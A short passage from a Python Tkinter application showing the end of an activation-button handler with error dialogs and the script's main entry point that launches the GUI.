            self.backend.run_activation_flow()
        except Exception as e:
            self.update_status(f"FATAL ERROR: {e}", "error")
            messagebox.showerror("Activation Failed", str(e), parent=root_for_dialogs)
        finally:
            self.activate_btn.config(state=tk.NORMAL)


root_for_dialogs = None

if __name__ == "__main__":
    try:
        app = ModernApp()
        app.mainloop()
    except KeyboardInterrupt:
        print(f"\n{Style.YELLOW}Interrupted by user.{Style.RESET}")
        sys.exit(0)